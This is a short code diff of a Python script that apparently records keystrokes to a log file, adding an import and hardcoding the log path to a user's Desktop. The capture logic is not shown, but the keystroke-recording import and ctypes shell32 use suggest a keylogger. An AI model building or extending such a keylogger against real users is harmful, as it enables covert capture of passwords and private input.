@@ -1,8 +1,9 @@
 from keyboard import record
 import ctypes #Funny C in Py
 from sys import executable, argv
+from os.path import join
 
-output = open("log.txt", 'w')
+output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
 c = (ctypes.windll.shell32)
 
 def start():
